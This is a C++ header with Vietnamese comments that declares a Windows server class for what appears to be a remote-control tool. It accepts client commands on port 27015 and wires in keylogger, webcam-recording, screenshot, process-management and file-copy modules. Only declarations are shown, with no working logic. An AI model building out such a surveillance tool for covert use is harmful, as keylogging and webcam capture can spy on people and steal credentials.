#pragma once
#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <thread>
#include <iostream>
#include <string>
#include "keylogger.h"
#include "PowerRelatedFunction.h"
#include "process_manager.h"
#include "copyfile.h"
#include "WebcamRecorder.h"
#include "screenshot.h"
#pragma comment(lib, "ws2_32.lib")

class Server
{
public:
    std::string port; //Port kết nối của Server
    WSADATA wsaData; // Cấu trúc dữ liệu của Winsock API
    SOCKET listenSock = INVALID_SOCKET; //Socket lắng nghe kết nối
    SOCKET clientSock = INVALID_SOCKET; //Socket giao tiếp với Client
    char command[BUFSIZ]; //Mảng lưu lệnh nhận từ Client
    struct addrinfo hints{}, *res = nullptr; 
    // hints sử cung để lưu thông tin Socket
    // res dùng để trỏ tới dang sách kết quả địa chỉ sau khi gọi hàm getaddrinfo()

    const char *PORT = "27015"; //Port mặc định của chương trình
    const int BUFSIZE = 512; //Độ dài tối đa của command

    keylogger keylog;
    std::thread keyLogThread;

    std::string videoFilePath;

    Server(std::string _port);
    Server();
    void Init();
    bool WaitForConnection();
    bool GetCommandFromClient();
    void ProcessCommand();
    void SendResult(std::string path);
    void DisconnectClient();
    void Shutdown();
};